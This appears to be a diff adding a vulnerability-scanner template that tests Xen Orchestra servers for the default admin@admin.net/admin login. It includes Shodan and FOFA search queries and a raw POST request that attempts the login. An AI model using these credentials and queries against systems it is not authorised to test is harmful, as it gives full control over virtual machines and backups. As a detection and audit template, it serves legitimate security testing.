@@ -1,0 +1,70 @@
+id: xen-orchestra-default-login
+
+info:
+  name: Xen Orchestra - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Xen Orchestra was found using default credentials. On first start, when no user exists, xo-server creates an administrator account admin@admin.net with the password "admin". An attacker who logs in gains full administrative control over the managed XCP-ng/XenServer pools, including all virtual machines, storage and backups.
+  impact: |
+    An attacker with default credentials gains administrator access to Xen Orchestra, allowing them to start, stop, delete or export virtual machines, access VM consoles and tamper with backups across all connected hypervisors.
+  remediation: |
+    Create a new administrator account with a strong password and remove the default admin@admin.net account.
+  reference:
+    - https://docs.xen-orchestra.com/installation
+    - https://docs.xen-orchestra.com/troubleshooting
+    - https://github.com/vatesfr/xen-orchestra/blob/master/packages/xo-server/src/xo-mixins/subjects.mjs
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    vendor: vates
+    product: xen_orchestra
+    shodan-query: http.title:"Xen Orchestra"
+    fofa-query: title="Xen Orchestra"
+  tags: xen-orchestra,vates,xcp-ng,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /signin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Xen Orchestra</title>")'
+          - 'contains(body, "signin/local")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /signin/local HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{url_encode(username)}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin@admin.net
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 303'
+          - 'regex("(?mi)^set-cookie:\\s*token=", header)'
+          - '!regex("(?mi)^location:\\s*/signin", header)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
